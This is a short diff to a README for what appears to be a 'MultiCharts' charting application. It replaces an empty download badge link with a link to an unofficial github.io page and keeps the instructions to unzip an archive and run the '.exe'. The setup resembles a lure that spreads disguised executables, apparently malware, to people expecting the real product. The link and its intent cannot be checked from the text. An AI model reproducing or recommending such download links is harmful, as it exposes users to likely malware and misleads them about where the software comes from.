@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://multicharts-download.github.io/.github/)
 
 ## 📸 Overview
 <img width="800" height="450" alt="multicharts-advanced-charting" src="https://github.com/user-attachments/assets/65ad2258-20c4-4d58-a4e7-ebdc23d733f5" />
